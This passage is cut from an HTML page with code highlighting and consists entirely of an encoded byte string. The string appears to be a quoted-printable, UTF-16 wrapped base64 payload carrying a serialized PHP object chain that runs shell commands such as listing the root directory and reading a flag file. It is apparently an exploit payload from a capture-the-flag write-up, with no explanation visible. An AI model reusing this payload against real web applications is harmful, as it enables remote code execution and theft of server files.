class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">45</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">70</span>=<span class="hljs-number">00</span>=<span class="hljs-number">37</span>=<span class="hljs-number">00</span>=<span class="hljs-number">61</span>=<span class="hljs-number">00</span>=<span class="hljs-number">54</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">77</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">38</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">55</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">31</span>=<span class="hljs-number">00</span>=<span class="hljs-number">76</span>=<span class="hljs-number">00</span>=<span class="hljs-number">59</span>=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">74</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">54</span>=<span class="hljs-number">00</span>=<span class="hljs-number">47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">39</span>=<span class="hljs-number">00</span>=<span class="hljs-number">68</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">79</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">45</span>=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">59</span>=<span class="hljs-number">00</span>=<span class="hljs-number">57</span>=<span class="hljs-number">00</span>=<span class="hljs-number">78</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">65</span>=<span class="hljs-number">00</span>=<span class="hljs-number">33</span>=<span class="hljs-number">00</span>=<span class="hljs-number">31</span>=<span class="hljs-number">00</span>=<span class="hljs-number">70</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">45</span>=<span class="hljs-number">00</span>=<span class="hljs-number">37</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">73</span>=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">74</span>=<span class="hljs-number">00</span>=<span class="hljs-number">39</span>=<span class="hljs-number">00</span>=<span class="hljs-number">66</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">44</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">43</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">38</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">7</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">67</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">73</span>=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">48</span>=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">74</span>=<span class="hljs-number">00</span>=<span class="hljs-number">61</span>=<span class="hljs-number">00</span>=<span class="hljs-number">57</span>=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">68</span>=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">76</span>=<span class="hljs-number">00</span>=<span class="hljs-number">59</span>=<span class="hljs-number">00</span>=<span class="hljs-number">57</span>=<span class="hljs-number">00</span>=<span class="hljs-number">52</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">59</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">61</span>=<span class="hljs-number">00</span>=<span class="hljs-number">57</span>=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">45</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">79</span>=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">59</span>=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">45</span>=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">57</span>=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">78</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">74</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">45</span>=<span class="hljs-number">00</span>=<span class="hljs-number">77</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">75</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">57</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">61</span>=<span class="hljs-number">00</span>=<span class="hljs-number">57</span>=<span class="hljs-number">00</span>=<span class="hljs-number">39</span>=<span class="hljs-number">00</span>=<span class="hljs-number">75</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">74</span>=<span class="hljs-number">00</span>=<span class="hljs-number">50</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">79</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">72</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">45</span>=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">79</span>=<span class="hljs-number">00</span>=<span class="hljs-number">59</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">52</span>=<span class="hljs-number">00</span>=<span class="hljs-number">76</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">78</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">72</span>=<span class="hljs-number">00</span>=<span class="hljs-number">52</span>=<span class="hljs-number">00</span>=<span class="hljs-number">47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">61</span>=<span class="hljs-number">00</span>=<span class="hljs-number">57</span>=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">70</span>=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">76</span>=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">70</span>=<span class="hljs-number">00</span>=<span class="hljs-number">37</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">67</span>=<span class="hljs-number">00</span>=<span class="hljs-number">42</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">61</span>=<span class="hljs-number">00</span>=<span class="hljs-number">57</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">38</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">7</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">55</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">31</span>=<span class="hljs-number">00</span>=<span class="hljs-number">76</span>=<span class="hljs-number">00</span>=<span class="hljs-number">59</span>=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">74</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">52</span>=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">75</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">68</span>=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">39</span>=<span class="hljs-number">00</span>=<span class="hljs-number">79</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">45</span>=<span class="hljs-number">00</span>=<span class="hljs-number">31</span>=<span class="hljs-number">00</span>=<span class="hljs-number">76</span>=<span class="hljs-number">00</span>=<span class="hljs-number">59</span>=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">74</span>=<span class="hljs-number">00</span>=<span class="hljs-number">44</span>=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">61</span>=<span class="hljs-number">00</span>=<span class="hljs-number">57</span>=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">31</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">61</span>=<span class="hljs-number">00</span>=<span class="hljs-number">57</span>=<span class="hljs-number">00</span>=<span class="hljs-number">39</span>=<span class="hljs-number">00</span>=<span class="hljs-number">75</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">78</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">74</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">67</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">71</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">68</span>=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">57</span>=<span class="hljs-number">00</span>=<span class="hljs-number">55</span>=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">33</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">7</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">59</span>=<span class="hljs-number">00</span>=<span class="hljs-number">57</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">79</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">37</span>=<span class="hljs-number">00</span>=<span class="hljs-number">66</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">7</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">43</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">59</span>=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">39</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">53</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">37</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">31</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">44</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">50</span>=<span class="hljs-number">00</span>=<span class="hljs-number">44</span>=<span class="hljs-number">00</span>=<span class="hljs-number">39</span>=<span class="hljs-number">00</span>=<span class="hljs-number">77</span>=<span class="hljs-number">00</span>=<span class="hljs-number">61</span>=<span class="hljs-number">00</span>=<span class="hljs-number">48</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">67</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">33</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">7</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">74</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">43</span>=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">73</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">79</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">76</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">79</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">37</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">33</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">7</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">74</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">43</span>=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">59</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">67</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">73</span>=<span class="hljs-number">00</span>=<span class="hljs-number">59</span>=<span class="hljs-number">00</span>=<span class="hljs-number">57</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">75</span>=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">48</span>=<span class="hljs-number">00</span>=<span class="hljs-number">68</span>=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">79</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">37</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">34</span>=<span class="hljs-number">00</span>=<span class="hljs-number">61</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">37</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">44</span>=<span class="hljs-number">00</span>=<span class="hljs-number">38</span>=<span class="hljs-number">00</span>=<span class="hljs-number">2</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">74</span>=<span class="hljs-number">00</span>=<span class="hljs-number">39</span>=<span class="hljs-number">00</span>=<span class="hljs-number">66</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">43</span>=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">65</span>=<span class="hljs-number">00</span>=<span class="hljs-number">48</span>=<span 